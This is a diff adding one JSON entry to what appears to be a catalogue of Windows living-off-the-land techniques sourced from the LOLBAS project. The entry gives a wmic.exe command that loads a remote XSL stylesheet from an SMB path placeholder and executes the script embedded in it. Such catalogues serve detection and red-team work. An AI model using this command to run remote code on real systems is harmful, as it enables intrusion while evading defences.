@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-wmic-exe-execute-4",
+  "name": "LOLBAS · Wmic.exe (Execute) #4",
+  "command": "wmic.exe process get brief /format:\"{PATH_SMB:.xsl}\"",
+  "description": "Executes JScript or VBScript embedded in the target remote XSL stylsheet.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "wmic",
+    "execute"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Wmic/",
+  "upstream_id": "Wmic.exe/Execute/3",
+  "category": "lolbas",
+  "subcategory": "execute",
+  "references": [
+    {
+      "title": "LOLBAS — Wmic.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Wmic/"
+    }
+  ]
+}
